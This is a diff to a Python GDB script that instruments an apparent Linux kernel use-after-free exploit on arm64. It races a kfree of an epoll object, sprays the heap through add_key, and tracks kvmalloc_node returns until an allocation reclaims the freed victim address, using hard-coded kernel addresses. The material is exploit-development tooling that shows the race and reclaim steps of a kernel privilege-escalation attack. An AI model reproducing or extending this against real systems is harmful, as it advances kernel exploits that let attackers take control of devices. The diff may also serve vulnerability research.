@@ -85,24 +85,69 @@ def run_race():
     gdb.execute(f"clear *{kfree_call_addr + 4}")
     print(f"[*] SUCCESS: Thread B finished kfree(inner_epoll)")
     
-    print("[*] Waiting 1 second for Thread B to finish heap spray...")
+    print("[*] Monitoring Thread B heap spray allocations...")
+    # Break immediately after kvmalloc_node returns inside __arm64_sys_add_key
+    alloc_ret_addr = 0xffffffc00859ce04
+    gdb.execute(f"break *{alloc_ret_addr}")
+    
     import threading
     import os
     import signal
     import time
     
     def interrupt_gdb():
-        time.sleep(1.0)
+        time.sleep(10.0)
         os.kill(os.getpid(), signal.SIGINT)
         
     threading.Thread(target=interrupt_gdb).start()
     
-    try:
+    alloc_count = 0
+    victim_address = inner_epoll
+    hit_victim = False
+    
+    # We will break at kvmalloc_node return, and if we hit the victim, we set a flag and trace the rest of the function.
+    # The return from sys_add_key is 0xffffffc00859ced4 (ret instruction). Let's trace it.
+    sys_add_key_ret = 0xffffffc00859ced4
+    
+    while alloc_count < 256:
+        try:
+            gdb.execute("continue")
+        except gdb.error:
+            print("[*] Caught GDB error (timeout), stopping loop.")
+            break
+            
+        pc = int(gdb.parse_and_eval("$pc"))
+        if pc == alloc_ret_addr:
+            ret_addr = int(gdb.parse_and_eval("$x0")) & 0xffffffffffffffff
+            thr_num = gdb.selected_thread().num
+            alloc_count += 1
+            
+            untagged_ret = ret_addr & 0x00ffffffffffffff
+            untagged_victim = victim_address & 0x00ffffffffffffff
+            
+            if untagged_ret == untagged_victim:
+                print(f"[!] CASE B: ALLOCATION {alloc_count} RETURNED EXACT VICTIM ADDRESS!")
+                print(f"    Victim: {hex(victim_address)} | Allocated: {hex(ret_addr)} | Thread: {thr_num}")
+                hit_victim = True
+                break
+            else:
+                print(f"[*] Alloc {alloc_count}: returned {hex(ret_addr)} (Thread {thr_num})")
+                
+    if hit_victim:
+        print("[*] Hit victim address. Setting breakpoint at sys_add_key return.")
+        gdb.execute(f"break *{sys_add_key_ret}")
         gdb.execute("continue")
-    except gdb.error:
-        pass
         
-    print("[*] Heap spray should be complete.")
+        pc_ret = int(gdb.parse_and_eval("$pc"))
+        if pc_ret == sys_add_key_ret:
+            ret_val = int(gdb.parse_and_eval("$x0"))
+            if ret_val & 0x8000000000000000:
+                ret_val = -((~ret_val + 1) & 0xffffffffffffffff)
+            print(f"[*] sys_add_key returned: {ret_val}")
+        gdb.execute(f"clear *{sys_add_key_ret}")
+                
+    gdb.execute(f"clear *{alloc_ret_addr}")
+    print("[*] Syscall diagnostic complete.")
     
     # 5. Restore Thread A's instructions and set its PC back to the cmp instruction
     print(f"[*] Switching back to Thread A ({thread_a})")
